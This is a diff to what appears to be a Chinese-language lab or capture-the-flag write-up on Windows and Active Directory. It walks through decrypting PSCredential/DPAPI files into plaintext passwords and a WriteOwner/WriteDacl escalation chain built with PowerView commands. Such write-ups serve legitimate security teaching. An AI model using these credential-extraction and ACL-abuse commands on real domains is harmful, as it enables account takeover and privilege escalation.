@@ -113,6 +113,16 @@ gci C:\Users\ -Filter *.txt -File -Recurse
 
 在 `sfitz` 的 `Document` 中发现文件 `connection.xml`。
 
+`cred.xml` 不是普通加密后无法恢复的文件，而是由当前用户上下文导出的 PowerShell 凭据对象，
+流程如下，假设用户为 `Enil`：
+
+1. Enil 使用 Export-Clixml 导出 PSCredential
+2. 用户名明文保存：`Hernandez/Enil`，密码以 SecureString / DPAPI Blob 形式保存
+3. 在 Enil 的会话、以 Enil 的用户执行 PowerShell
+4. Import-Clixml 调用 Windows DPAPI 解开用户可解密的数据
+5. GetNetworkCredential().Password 将 SecureString 转换明文
+6. 得到 Enil 的密码
+
 ```bash
 PS C:\Users\sfitz\Documents> cat connection.xml
 cat connection.xml
@@ -144,7 +154,24 @@ $cred.GetNetworkCredential().Password
 f8gQ8fynP44ek1m3
 ```
 
+也可以像下面这样一句话解决。
+
+```bash
+C:\Windows\system32>powershell -c "$cred=Import-Clixml C:\Users\nico\Desktop\cred.xml;$cred.GetNetworkCredential().Password"
+powershell -c "$cred=Import-Clixml C:\Users\nico\Desktop\cred.xml;$cred.GetNetworkCredential().Password"
+1ts-mag1c!!!
+```
+
 方法二
+
+这个方法的核心流程如下：
+
+1. 加密时：Enil 用户 + 本机 DPAPI 密钥
+2. 得到密文 `0100...`
+3. 仍以 Enil 用户在同一台主机执行 ConvertTo-SecureString
+4. Windows DPAPI 能找到对应密钥并解密
+5. 得到 SecureString
+6. GetNetworkCredential().Password 转换为明文
 
 ```bash
 PS C:\Users\sfitz\Documents> $pass = '01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6' | ConvertTo-SecureString
@@ -491,4 +518,56 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
 4375a629c7c67c8e29db269060c955cb
+```
+
+### WriteOwner
+
+WriteOwner 指有权修改某个对象的所有者（Owner）。
+
+1. 拥有 WriteOwner
+2. 把对象 Owner 改成自己或自己控制的账户
+3. Owner 天然可以修改对象的 DACL（访问控制列表）
+4. 给自己授予更高权限
+5. 利用新权限完成提权或横向移动
+
+举个例子，有下面这一条提权链条：
+
+`tom（WriteOwner）` –> `claire（WriteDacl）` –> `Backup_Admins`
+
+在这里 Tom 的 WriteOwner 权限不是直接给 Administrator 提权，而是让 Tom 能控制 `claire` 这个 AD 用户对象，作为后续提权链的第一环。
+
+Tom 可以把 Claire 对象的 Owner 改为 Tom。对应的逻辑如下：
+
+```PowerShell
+Set-DomainObjectOwner -Identity claire -OwnerIdentity Tom
+```
+
+### WriteDacl
+
+WriteDacl 指可以修改某个对象的权限列表（DACL）。DACL 由一条条 ACE 组成，用来决定 ”谁能对该对象做什么“。拥有 WriteDacl 就能增删或修改这些 ACE。以下面这个提权链为例：
+
+`tom（WriteOwner）` –> `claire（WriteDacl）` –> `Backup_Admins`
+
+给出修改密码的命令如下：
+
+```PowerShell
+Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Right ResetPassword
+```
+
+```PowerShell
+$pass = ConvertTo-SecureString '123456' -AsPlainText -Force
+```
+
+其中 `AsPlainText` 表示输入的是明文密码，而不是已经加密的 `SecureString` 数据。
+
+下面是添加权限的命令，修改 `Backup_Admins` 这个组对象的 ACL，给 `claire` 添加 `WriteMembers`。
+
+```PowerShell
+Add-DomainObjectAcl -TargetIdentity 'Backup_Admins' -PrincipalIdentity claire -Rights WriteMembers
+```
+
+将 `claire` 添加为 `Backup_Admins` 成员。
+
+```PowerShell
+Add-DomainGroupMember -Identity "Backup_Admins" -Members claire
 ```
